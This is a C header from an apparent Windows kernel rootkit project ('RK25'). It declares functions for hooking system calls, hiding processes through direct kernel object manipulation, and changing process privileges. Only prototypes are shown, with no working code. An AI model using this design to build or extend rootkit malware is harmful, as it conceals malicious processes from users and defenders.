#ifndef _RK25_PROC_H_
#define _RK25_PROC_H_

#include <ntddk.h>
#include "../common/hook/ntqsi/rk25_hook_ntqsi.h"
#include "../common/hook/nttp/rk25_hook_nttp.h"
#include "../common/dkom/proc/rk25_dkom_process.h"
#include "hide/rk25_hide_proc.h"
#include "priv/rk25_priv_process.h"
#include "callback/rk25_callback.h"

VOID RK25ProcessInit();
VOID RK25ProcessFree();

NTSTATUS RK25ProcessHook(ULONG attr);

/*
* The process name will be not found if _EPROCESS for a current process has been already hided
* Update: fixed
*/
NTSTATUS RK25ProcessHide(ULONG attr, PVOID target);
//NTSTATUS RK25ProcessHideByPID(ULONG attr, HANDLE pid);
//NTSTATUS RK25ProcessHideByName(ULONG attr, CONST PCHAR name);

NTSTATUS RK25ProcessPriv(ULONG attr, HANDLE pid);

#endif // !_RK25_PROC_H_